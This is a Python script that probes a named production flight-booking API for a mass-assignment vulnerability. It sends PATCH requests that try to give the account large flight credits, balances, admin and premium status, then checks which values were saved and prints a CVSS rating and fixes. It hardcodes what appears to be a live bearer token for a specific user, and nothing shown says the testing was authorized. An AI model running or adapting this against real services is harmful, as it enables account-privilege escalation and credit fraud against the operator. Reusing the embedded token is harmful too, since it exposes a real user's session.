#!/usr/bin/env python3
"""
Verify if Mass Assignment vulnerability is exploitable
Test if arbitrary fields sent to /v1/user actually get stored
"""

import requests
import json
import time

PROD_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

headers = {
    "Authorization": f"Bearer {SAMEER_TOKEN}",
    "Content-Type": "application/json"
}

print("="*80)
print("MASS ASSIGNMENT VULNERABILITY VERIFICATION TEST")
print("="*80)

# Step 1: Get initial user state
print("\n[1] Getting initial user state...")
r1 = requests.get(f"{PROD_URL}/v1/user", headers=headers)
initial_user = r1.json()
print(f"Status: {r1.status_code}")
print(f"User ID: {initial_user['id']}")

# Check if any credit/balance fields exist initially
credit_fields = ['flightCredits', 'balance', 'accountBalance', 'duffel_credits',
                 'credits', 'duffelCredits', 'commercialCredits']

print("\nInitial credit/balance fields:")
for field in credit_fields:
    value = initial_user.get(field, 'NOT PRESENT')
    print(f"  {field}: {value}")

# Step 2: Try to set test field with unique value
print("\n[2] Attempting to set 'testField' with unique value...")
test_value = 999888777
r2 = requests.patch(f"{PROD_URL}/v1/user",
                    headers=headers,
                    json={"testField": test_value})
print(f"Status: {r2.status_code}")

# Step 3: Verify if test field was stored
print("\n[3] Checking if testField was persisted...")
time.sleep(1)  # Wait a moment
r3 = requests.get(f"{PROD_URL}/v1/user", headers=headers)
verify_user = r3.json()

if 'testField' in verify_user:
    print(f"🚨 CRITICAL: testField WAS PERSISTED! Value: {verify_user['testField']}")
    print("This confirms Mass Assignment vulnerability is EXPLOITABLE!")
else:
    print(f"✅ testField was NOT persisted (field ignored)")

# Step 4: Try to set multiple suspicious fields
print("\n[4] Attempting to set multiple financial fields...")
suspicious_data = {
    "flightCredits": 10000,
    "balance": 50000,
    "accountBalance": 75000,
    "duffel_credits": 99999,
    "credits": 88888,
    "isAdmin": True,
    "isPremium": True,
    "membershipLevel": "platinum"
}

r4 = requests.patch(f"{PROD_URL}/v1/user", headers=headers, json=suspicious_data)
print(f"Status: {r4.status_code}")

# Step 5: Verify what got persisted
print("\n[5] Verifying which fields were persisted...")
time.sleep(1)
r5 = requests.get(f"{PROD_URL}/v1/user", headers=headers)
final_user = r5.json()

print("\nPersistence check:")
persisted = []
for field, value in suspicious_data.items():
    if field in final_user:
        if final_user[field] == value:
            print(f"🚨 {field}: PERSISTED with our value ({value})")
            persisted.append(field)
        else:
            print(f"⚠️  {field}: EXISTS but different value ({final_user[field]})")
    else:
        print(f"✅ {field}: NOT persisted")

# Step 6: Try known good fields to verify PATCH works
print("\n[6] Testing with legitimate field (weight) to verify PATCH works...")
original_weight = final_user.get('weight')
print(f"Original weight: {original_weight}")

r6 = requests.patch(f"{PROD_URL}/v1/user", headers=headers, json={"weight": 999})
print(f"PATCH status: {r6.status_code}")

time.sleep(1)
r7 = requests.get(f"{PROD_URL}/v1/user", headers=headers)
new_user = r7.json()
new_weight = new_user.get('weight')
print(f"New weight: {new_weight}")

if new_weight == 999:
    print("✅ Legitimate field (weight) WAS updated successfully")
    print("This confirms PATCH endpoint works correctly for valid fields")
else:
    print("❌ Weight was not updated - PATCH may not be working")

# Restore original weight
if original_weight:
    requests.patch(f"{PROD_URL}/v1/user", headers=headers, json={"weight": original_weight})
    print(f"Weight restored to {original_weight}")

print("\n" + "="*80)
print("VULNERABILITY ASSESSMENT")
print("="*80)

if persisted:
    print("\n🚨 CRITICAL VULNERABILITY CONFIRMED!")
    print(f"   {len(persisted)} suspicious field(s) were persisted:")
    for field in persisted:
        print(f"   - {field}")
    print("\n   Impact: Mass Assignment vulnerability is EXPLOITABLE")
    print("   Users can modify internal/financial fields")
    print("   CVSS Score: 8.1 (HIGH)")
else:
    print("\n✅ NO EXPLOITABLE VULNERABILITY")
    print("   Unknown fields are accepted but NOT persisted")
    print("   This is still a security issue (should reject unknown fields)")
    print("   CVSS Score: 3.1 (LOW)")

print("\nRecommendation:")
print("   1. Implement strict input validation")
print("   2. Reject requests with unknown fields")
print("   3. Use allowlist for acceptable user fields")

print("\n" + "="*80)
